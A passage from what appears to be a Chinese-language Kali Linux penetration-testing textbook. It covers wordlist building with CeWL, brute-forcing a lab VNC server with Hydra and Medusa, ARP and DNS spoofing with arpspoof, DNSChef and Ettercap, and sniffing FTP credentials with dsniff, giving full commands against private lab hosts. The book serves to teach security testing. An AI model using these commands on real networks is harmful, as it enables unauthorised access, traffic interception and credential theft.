● --depth N 或-d N：提取深度，分析 N 級連結以內的網頁內容；提取深度的預設值是2。
● --min_word_length N 或-m N：單詞的最小長度，少於N 個字元的單詞不會被收錄；單詞最小長度的預設值是3。
● --verbose 或-v：詳細提示模式。
● --write 或-w：設定輸出檔的檔案名。
如果在運行CeWL時遇到Error: zip/zip gem not installed錯誤，那麼就要使用gem install zip/zip 指令安裝相應的功能包：
gem install zip
Fetching: zip-2.0.2.gem (100%)
Successfully installed zip-2.0.2
1 gem installed
Installing ri documentation for zip-2.0.2...
Installing RDoc documentation for zip-2.0.2...
結合上述選項，我們使用下述指令從目標網站收集單詞。
cewl -w target.txt http://www.target.com
稍等片刻之後，程式會把收集到的單詞保存為檔target.txt。在Kali系統裡，這個檔位於目錄/usr/share/cewl。
我們打開上述目錄裡的target.txt檔，可以看到下述內容。
Device
dataset
sauerlo
Sauer
agentChange
ouput
fileWrite
oBy
strips
mThe
270
Specialforces
Damian
GoD
zERo
zine
Disney
N00bz
xThe
Cracked
Question
Marc
Doudiet
Swiss
Strafor
Electric
Alchemy
2．Hydra
Hydra是一款猜測並破解用戶名和密碼的工具。它支持多種網路通訊協定，可破解HTTP、FTP、POP3和SMB等協定的密碼。它會使用字典並行窮舉網路服務的用戶名和密碼。預設情況下，它向目標主機發起16個並行連接同時進行多組測試。
如需啟動Hydra程式，可在終端中使用下述指令。
hydra
上述指令將會在螢幕上顯示簡單的使用說明。
本例將演示使用hydra程式破解192.168.56.101的VNC伺服器的密碼。如果密碼字典的檔案名是password.lst，我們可使用下述指令。
hydra -P password.lst 192.168.56.101 vnc
上述指令的運行結果將如圖10.17所示。
上述資訊表明，Hydra 成功地破解了 VNC 伺服器的密碼。被測伺服器使用的密碼是password01和password。
 
圖10.17
下一步工作就是驗證Hydra破解的密碼。我們可直接運行vncviewer程式，使用這些密碼連接到遠端主機的VNC伺服器。
使用vncviewer驗證密碼的情況如圖10.18所示。
 
圖10.18
上述資訊表明，破解的密碼可以連接到VNC伺服器，而且該密碼還具有伺服器的root權限(許可權)。撿到大便宜了！
Hydra程式有一個對應的GUI程式。
xhydra
上述指令將會啟動Hydra的GTK圖形介面程式。使用這個程式破解SSH服務密碼的情況如圖10.19所示。
 
圖10.19
經驗表明，xhydra程式不如其命令列程式hydra那樣靈活，不能調整很多設置。例如，在破解 VNC 服務時，xhydra無法設置用戶名；更為不幸的是，它就沒有設置用戶名的功能。
3．Medusa
Medusa是另外一款線上破解網路服務密碼的程式。它具有速度快、併發性能強和範本化的特點。現在，它能夠通過相應範本破解CVS、FTP、HTTP、IMAP、MS-SQL、MySQL、NCP（NetWare）、PcAnywhere、POP3、PostgreSQL、rexec、Rlogin、rsh、SMB、SMTP（VRFY）、SNMP、SSHv2、SVN、Telnet、VmAuthd、VNC協議，另有一個通用處理範本。
有關Medusa和Hydra的具體區別，請參見http://foofus.net/goons/jmk/medusa/medusa-compare.html。
在實際的滲透測試工作中，可同時使用這兩款工具、盡可能地獲取被測主機的各種資訊。
如需啟動Medusa工具，可在終端中使用下述指令。
medusa
上述指令將會在螢幕上顯示簡單的使用說明。
Medusa程式有很多選項，其中常用的一些選項如下所示。
● -u 或-U[FILE]：指定用戶名或用戶名字典。
● -h 或-H[FILE]：指定主機名稱或主機名稱字典。
● -p 或-P[FILE]：指定密碼或密碼字典。
● -M：配置測試所用的範本的名稱。亦可通過-d 選項搜索範本。
● -O：設置輸出檔的檔案名。
● -V：設置提示資訊的詳細程度。如果使用了-v 4 選項，將只能看到成功破解的登錄憑據。
前面，我們用Hydra破解了VNC伺服器的密碼；現在我們再用Medusa作一次相同的破解試驗。
medusa -u root -P password.lst -h 192.168.56.101 -M vnc -v 4
上述指令的運行結果如下。
Medusa v2.0 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks
[email protected]
ACCOUNT FOUND: [vnc] Host: 192.168.56.101 User: root Password:
password [SUCCESS]
Medusa只找到了一個VNC密碼；相比之下，Hydra能夠找到了兩個VNC密碼。
10.3 網路欺騙工具
前面介紹了多款破解密碼的工具。本節將探索通過網路欺騙的手段提升權限(許可權)的各種方法。
網路欺騙（network spoofing）泛指修改網路資料的各種手段。例如，偽造MAC 位址、偽造IP位址等的資料，都屬於網路欺騙的範疇。網路欺騙旨在於獲取網路上兩個工作階段主機的通信資料。
10.3.1 DNSChef
DNSChef（http://thesprawl.org/projects/dnschef/）是一款DNS代理工具。它可替DNS伺服器對被測主機進行DNS回復，把功能變數名稱解析為攻擊者管控的IP，從而讓攻擊者的主機扮演真正的伺服器的角色。DNSChef的這種功能可用來分析甚至控制客戶主機的網路流量。
在使用DNSChef之前，您需要對被測主機進行調整，指定DNSChef的主機為被測主機的DNS伺服器。
● 如果被測主機安裝的是Linux 系統，那麼您應當修改/etc/resolv.conf 文件。
● 如果被測主機安裝的是 Windows，您可通過控制台的網路連接選項進行相應的設置。
在沒有權限(許可權)更改被測主機 DNS 伺服器設置的情況下，您就需要使用其他手段（例如ARP欺騙並搭設一個偽DHCP伺服器等）劫持被測主機的DNS請求。
本例涉及2台主機，一台是運行DNSChef的主機，其IP為192.168.2.21；另一台是被測（受害人的）主機，其IP是192.168.2.22。簡便起見，我們用Metasploitable的虛擬機器充當被測主機。
首先，我們要對DNSChef進行設置。
1．設置為DNS代理
第一步是把DNSChef設置為DNS代理伺服器。我們要在DNSChef的主機上運行下述指令。
dnschef
而後調整這台主機的DNS設置，使之使用本機（localhost）的DNS伺服器。
然後使用下述命令查詢google.com的DNS記錄。
host -t A google.com
上述指令向DNSChef發起DNS查詢，應當會顯示圖10.20所示的資訊。
這種設置將DNSChef調整為DNS代理伺服器。它將所有DNS解析請求轉發到上游解析伺服器。本例中，它的上游DNS伺服器是8.8.8.8。
 
圖10.20
2．偽造功能變數名稱記錄
在偽造google.com的功能變數名稱記錄之前，先來看看google.com的原始解析結果（見圖10.21）。
 
圖10.21
現在，我們要偽造 google.com 有關的 DNS 回應。和前一個例子裡的情況一樣，首先要修改/etc/resolv.conf檔，令被測主機使用DNSChef作為其DNS伺服器。
接下來在DNSChef所在的主機上使用下述指令。
dnschef --fakeip=192.168.2.21 --fakedomains google.com
--interface 192.168.2.21 -q
而後我們在被測主機查詢google.com的IP地址。
$ host -t A google.com
上述指令的運行結果如下。
google.com has address 192.168.2.21
此時，運行DNSChef的主機將提示圖10.22所示的資訊。
 
圖10.22
Kali集成的是v0.1版本的DNSChef程式。這個版本不支持IPv6。如果需要在IPv6的網路中使用這個程式，您需要將其升級為 v0.2 版（https://thesprawl.org/media/projects/dnschef-0.2.1.tar.gz）。
如需在IP v6 的網路裡使用DNSChef程式，就要在指令行裡啟用-6 選項。
此時，功能變數名稱 google.com 的 IPv6 的真正地址是 2404:6800:4003:802::1003。DNSChef主機的IPv6位址是fe80::a00:27ff:fe1c:5122/64。
在DNSChef伺服器中，使用下述指令偽造google.com的IPv6地址。
dnschef.py -6 --fakeipv6 fe80::a00:27ff:fe1c:5122 --interface :: -q
10.3.2 arpspoof
arpspoof 是一款在切換式網路中輔助進行網路監聽的實用工具。前文提過，在使用交換機進行資料交換的網路環境裡很難進行網路監聽，但arpspoof可以輔助我們完成這項任務。
arpspoof用於偽造網路中兩台設備的ARP通信。
常規情況下，當主機A要和主機B（閘道）進行通信的時候，主機A會廣播ARP請求以獲取主機B 的MAC 位址。此後，主機B 將會回應這個ARP 請求，在ARP Reply 資料包裡聲明自己的MAC位址；與此同時，主機B也會將ARP廣播中主機A的MAC位址記錄下來。此後，主機A和主機B才能開始通信（見圖10.23）。
 
圖10.23
如果攻擊者C想要監聽主機A和主機B之間的網路流量，則可以向主機A發送ARP回復，告訴它主機B使用的是主機C的MAC位址（33.33.33.33.33.33）；而後它還要通告主機B，“主機A的MAC位址是33.33.33.33.33.33”（見圖10.24）。
 
圖10.24
在ARP欺騙生效之後，主機A和主機B之間的所有網路資料包都會通過主機C轉發。
在使用arpspoof之前，需要在Kali Linux（運行ARPspoof）的主機上啟用IP 轉發功能。這就需要以root使用者的身份執行下述指令。
echo 1 > /proc/sys/net/ipv4/ip_forward
要通過指令行介面啟動arpspoof程式，可在終端中執行下述指令。
arpspoof
上述指令將會在螢幕上顯示程式的使用說明。
本例的試驗環境的具體情況如下所示。
閘道的配置資訊如下。
● MAC 地址：00-50-56-C0-00-08
● IP 地址：192.168.65.1
● 子網路遮罩：255.255.255.0
被測主機的配置如下。
● MAC 地址：00-0C-29-35-C9-CD
● IP 地址：192.168.65.129
● 子網路遮罩：255.255.255.0
測試主機的配置如下。
● MAC 地址：00: 0C: 29: 09: 22: 31
● IP 地址：192.168.65.130
● 子網路遮罩：255.255.255.0
在啟動程式以前，被測主機的ARP緩存如下所示。
Interface: 192.168.65.129 --- 0x30002
Internet Address Physical Address Type
192.168.65.1　　00-50-56-c0-00-08　dynamic
通過以下命令，對被測主機實施ARP欺騙。
arpspoof -t 192.168.65.129 192.168.65.1
在被測主機上稍等片刻，然後用 ping 命令測試閘道的連接情況。被測主機的 ARP 緩存很快就就會改變為下述內容。
Interface: 192.168.65.129 --- 0x30002
Internet Address Physical Address Type
192.168.65.1　　00-0C-29-09-22-31　dynamic
上述資訊表明，在被測主機的ARP緩存裡，閘道的MAC地址由00-50-56-c0-00-08改變為00-0C-29-09-22-31。新的MAC位址是測試主機的MAC位址。從中可以看出，閘道對應MAC位址已經變成攻擊者機器的MAC地址。
10.3.3 Ettercap
Ettercap（http://www.ettercap-project.org/）是一款在LAN中進行中間人攻擊的工具集。它通過ARP攻擊充當網路通信的中間人。一且ARP協議的攻擊奏效，它就能夠：
● 修改資料連接；
● 截獲FTP、HTTP、POP 和SSH1 等協定的密碼；
● 通過偽造SSL 證書的手段劫持被測主機的HTTPS 會話。
ARP協議（位址解析通訊協定）用來把IP位址解析為物理位址（MAC位址）。當某個網路設備需要與其他網路資源通信時，它會通過ARP廣播查詢目標設備的MAC位址，目標設備也會通過ARP協定的資料包回復自己的MAC位址。此後，通信雙方都會將IP和MAC的對應資訊保存到自己的ARP緩存中，以節省後續通信的查詢時間。
在某台主機要進行通信時，它首先會查詢對方IP位址的MAC地址。此時，攻擊人員可將自己主機回復給查詢MAC位址的主機，以進行中間人攻擊。這種攻擊叫做ARP毒化（污染）攻擊和ARP欺騙。只有當攻擊主機和被測主機處於同一網段的時候，這種攻擊才會有效。
Kali Linux 提供的Ettercap 工具可以實施這種攻擊。Ettercap 有三種操作模式：文字模式、仿圖形（curses，以字元類比圖形介面）模式和GTK介面的圖形樸式。
若要以文字模式啟動Ettercap程式，可在終端中使用下述指令。
ettercap -T
若要以仿圖形模式啟動它，可在終端中使用下述指令。
ettercap -C
若要進入Ettercap的圖形模式，可在終端中使用下述指令。
ettercap -G
本例將使用Ettercap程式進行DNS欺騙攻擊。各主機採用了前一個例子的配置方法。此外，本例要使用額外的兩台主機：IP為192.16S.2.1的DNS伺服器；一台誘導被測主機連接的IP位址為192.168.2.22的Web伺服器。攻擊人員測試主機的IP位址為192.168.2.21。
欺騙攻擊的詳細步驟如下。
1. 進入Ettercap 的圖形模式。
2. 在菜單裡依次選中Sniff | Unified sniffing，選則相應的網卡，如圖10.25 所示。
 
圖10.25
3. 在功能表中選擇Hosts | Scan for hosts，掃描網路中的主機。
4. 在功能表中選擇Hosts | Hosts list，査看當前聯網的主機。
5. 指定要欺騙的主機。本例中，我們選擇192.168.2.1（DNS 伺服器）作為第一目標。在主機清單中，選中這個IP，然後點擊Add to Target 1。接下來，選中192.168.2.22並把它添加為第二目標Add to Target 22，如圖10.26 所示。
 
圖10.26
6. 在功能表裡依次選中Mitm| Arp poisoning，以啟動ARP 攻擊。現在DNS 伺服器和被測的MAC 位址均認為對方的IP 使用的是攻擊人員主機的MAC 位址。
7. 調整設定檔/usr/share/ettercap/etter.dns，將誘導伺服器的 IP 位址綁定在需要欺騙（攔截）的功能變數名稱上。
google.com　　A　　192.168.2.21
*.google.com　A　　192.168.2.21
www.google.com　PTR　192.168.2.21
這將把被測主機與google.com之間的全部通信誘導到攻擊人員部署的Web伺服器上。
8. 在功能表裡依次選中 Plugins | Manage the plugins，然後按兩下（啟動）dns_spoof外掛程式（見圖10.27）。
9. 最後，我們在被測主機上打開流覽器，訪問google.com。這將看到圖10.28 所示的資訊。
 
圖10.27
 
圖10.28
上述情況表明，DNS欺騙已經奏效。被測主機沒有看到真正的Google網站，它的流覽器訪問的是攻擊人員部署的Web伺服器。
10. 如需停止攻擊，可在菜單中依次選中Mitm | Stop mitm attack(s)。
即使覺得圖形介面的操作過於繁瑣，您也不必擔心。在Ettercap的文字模式裡，這些操作要簡潔得多。
在文字模式裡，以下指令就可完成剛才的前8步操作（第7步除外）。
ettercap -i eth0 -T -q -P dns_spoof -M ARP /192.168.2.1//192.168.2.22/
上述指令的運行結果如下。
Scanning for merged targets (2 hosts)...
2 hosts added to the hosts list...
ARP poisoning victims:
GROUP 1 : 192.168.2.1 F4:EC:38:EC:07:DC
GROUP 2 : 192.168.2.22 08:00:27:43:15:18Starting Unified sniffing...
Activating dns_spoof plugin...
dns_spoof: [safebrowsing-cache.google.com] spoofed to [192.168.2.21]
只要熟悉了Ettercap各選項的使用方法，就會發現Ettercap的文字模式十分方便。在文字模式裡，按Q鍵就可退出程式。
10.4 網路嗅探器
網路嗅探器器是監視網路資料的軟體程式或硬體設備。人們往往利用它複製網路資料的功能來檢測網路資料。借助這類工具，您可以看到網路中正在傳輸的資訊。
不久之前，網路嗅探器只是網路工程師用來解決網路問題的工具。但是，它確實可以用來作惡。如果網路資料以明文傳輸，且電腦之間通過集線器交換資料，那麼網路裡的通信資訊，例如用戶名、密碼、郵件內容等，將很容易被他人捕獲。幸運的是，如果使用交換機組網，那麼捕獲資料的難度會高一些，但是他人仍然能夠捕獲資訊。
許多工具程式都可用作網路嗅探器。本章將介紹幾款Kali Linux 收錄了的網路嗅探器。多數情況下，您需要在嗅探資料以前進行網路欺騙攻擊（請參考10.3節），因為它通常是成功施行網路嗅探的前提。
10.4.1 Dsniff
Dsniff 能夠在網路中捕獲密碼。目前，它可從以下協定中捕獲密碼：FTP、Telnet、SMTP、HTTP、POP、poppass、NNTP、IMAP、SNMP、LDAP、Rlogin、RIP、OSPF、PPTP MS-CHAP、NFS、VRRP、YP/NIS、SOCKS、X11、CVS、IRC、AIM、ICQ、 Napster、PostgreSQL、Meeting Maker、Citrix ICA、Symantec pcAnywhere、NAI Sniffer、Microsoft SMB、Oracle SQL*Net、Sybase 以及Microsoft SQL。
如需啟動dsniff程式，可在終端中使用下述指令。
dsniff -h
上述指令將會在螢幕上顯示程式的使用說明。我們將使用它捕獲FTP 密碼。在本例的演示中，FTP用戶端的IP是192.168.2.20，伺服器IP則是192.168.2.22，這兩台主機通過集線器連接。攻擊人員的主機IP為192.168.2.21。
在攻擊人員的測試主機上執行下述指令。
dsniff -i eth0 -m
其中，選項-i eth0 將使Dsniff 程式監聽eth0 網卡。而選項-m 則用於啟用程式的自動協定檢測功能。
然後，在裝有FTP用戶端程式的主機上，使用用戶端程式登錄FTP伺服器。
dsniff的運行結果如下。
dsniff: listening on eth0
________________________________________
20/08/13 18:54:53 tcp 192.168.2.20.36761 -> 192.168.2.22.21 (ftp)
USER user
PASS user01
從中可以看到，dsniff捕獲了用戶端登錄FTP伺服器時所用的用戶名和密碼。
10.4.2 tcpdump
tcpdump程式是一款網路嗅探器，它可以捕獲符合條件運算式的網路資料包。在沒有指定條件運算式的情況下，它會顯示所有網路資料包。而在指定條件運算式的情況下，它只會捕獲符合條件運算式的資料包。
tcpdump還可以將網路資料包存儲為檔，或從檔中讀取網路資料。
如需啟動tcpdump程式，可在終端中執行下麵這類指令。
tcpdump –i eth0 –s 96
這個命令將監聽eth0 網卡（-i eth0），捕獲大小為96 位元組（-s 96）的資料包。
現在嘗試嗅探從IP位址10.0.2.15到10.0.2.100的ICMP封包，這裡設置嗅探eth0 介面（-i eth0），不需要把位址轉換成主機名稱（-n），不需要列印時間戳記（-t），用十六進位格式和ASCII格式列印封包頭和資料（-X）。在主機10.0.2.15處輸入：
tcpdump -n -t -X -i eth0 –s 64 icmp and src 192.168.56.102 and dst192.168.56.101
上述指令的運行結果如圖10.29所示。
 
圖10.29
因為指定了條件運算式，tcpdump程式只會顯示符合條件運算式的網路資料包。在上述指令中，我們限定程式只顯示由IP為192.168.56.102的主機向IP為192.168.56.101的主機發送的ICMP資料包。
10.4.3 Wireshark
Wireshark是一個網路通訊協定分析程式。它的圖形程式可對它捕獲的資料包進行視覺化分析，有助於使用人員理解資料包中的各種資訊。
Wireshark的特徵有：
● 能夠分析1000 多種網路通訊協定；
● 能夠即時捕獲網路資料包，並能對資料包進行離線分析；
● 它具有業內功能最強大的資料包整理（顯示過濾）功能；
● 它的GUI 圖形介面程式和命令列程式TShark 都可以顯示資料包；
● 支援（讀寫）多種檔案格式的資料包檔。相容tcpdump（libpcap）、Network GeneralSniffer、Cisco Secure IDS iplog、Microsoft Network Monitor 等程式的檔案格式；
● 可從IEEE 802.11、藍牙、乙太網設備即時讀取資料；
● 可將結果匯出為XML、Postscript、CSV 和文本格式的檔。
如需啟動 Wireshark 程式，可在桌面功能表中依次選中Kali Linux| Sniffering/Spoofing |Network Sniffers | wireshark，或者在終端中使用下述指令。
wireshark
上述指令將啟動Wireshark網路通訊協定分析程式。如果要捕捉網路資料，可以在Interface List中選擇相應的網卡，如圖10.30所示。
 
圖10.30
Wireshark將在視窗裡顯示在監聽期間捕獲到的資料包。如果要停止捕捉網路資料，可以點擊頂端工具列中第四個按鈕 Stop running the live capture，或著在功能表裡選擇Capture｜Stop。
如圖10.31所示，可以在Filter欄裡設置過濾規則，以顯示特定的資料包。
 
圖10.31
在圖10.31中，我們在Filter欄裡設定好了過濾規則icmp，以使程式只顯示ICMP協定的資料包。
如果需要調整捕獲資料包的具體設置，可在菜單Capture | Options 中調整相應的選項，或在Wireshark 主介面中直接選中Capture Options 的圖示（見圖10.32）。
在這個介面中，您可以調整以下設置。
● Network interface（網路介面/網卡）。
● Buffer Size（緩衝區大小）：默認為1MB。
● Packet limitation（資料包容量上限，以位元組為單位）：預設情況下沒有限制。
● Capture filter to be used（捕獲規則）：預設情況下沒有過濾規則。
○ 如需保存捕獲到的資料，可在Capture file(s)區域裡設置輸出檔的檔案名。
○ 如需設置自動停止的功能，可在StopCapture區域裡設置自動停止捕獲資料的觸發條件。觸發條件可以是捕獲資料包的數量、捕獲資料包的作業時間或是資料包的大小。
○ 在Name Resolution 區域裡，各選項用於控制MAC 位址解析、網路名稱解析和傳輸名稱解析的功能選項。
 
圖10.32
10.5 本章總結
本章演示了提升本地權限(許可權)以及網路嗅探和網路欺騙的具體方法。此處介紹的所有工具都可用來取得更高的存取權限。攻擊人員可以通過網路嗅探和網路欺騙手段獲得更多的資訊，還可能獲取進入內網或者外網中其他主機的方式，這些資訊中可能含有更具價值的資訊。
我們最先介紹了本地權限(權限(許可權))提升漏洞的利用方法。在利用被測主機的網路服務漏洞之後，我們發現獲取的權限(許可權)很低，接著我們將自己的權限(權限(許可權))提升為 root 權限(許可權)。通過本地安全性漏洞提升權限(許可權)的技術有很多，本文利用的是內核漏洞。
接下來，我們闡述了攻擊密碼的方法。攻擊的方法有兩種：離線攻擊和線上攻擊。大多數的離線攻擊工具可利用彩虹表提髙破解速度，但同時需要消耗大量的硬碟空間。離線攻擊的好處是可以在自己的機器上進行，而無需擔心攻擊會導致目的機器上的某個帳戶被封停。線上攻擊則可以馬上査看攻擊結果，但需要小心攻擊可能導致目的機器上的某個帳戶被封停。接著，本章介紹了多款嗅探網路的工具，最後還介紹了一些可用於網路欺騙攻擊的工具。網路嗅探工具屬於被動攻擊工具。相比之下，因為網路欺騙工具能夠向網路發送資料，所以屬於主動攻擊工具。
在下一章，我們討論如何維護已經取得的存取權限。


```
